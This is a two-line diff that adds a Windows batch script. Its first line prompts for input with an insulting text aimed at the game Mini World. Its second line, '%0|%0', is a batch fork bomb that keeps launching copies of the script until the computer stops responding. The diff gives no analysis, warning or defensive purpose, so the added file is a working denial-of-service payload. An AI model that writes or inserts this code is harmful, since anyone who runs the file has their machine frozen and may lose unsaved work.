@@ -1,0 +1,2 @@
+set /p option=FUCKMINIWORLD@FUCKMINI.DOG-C:\MCT
+%0|%0
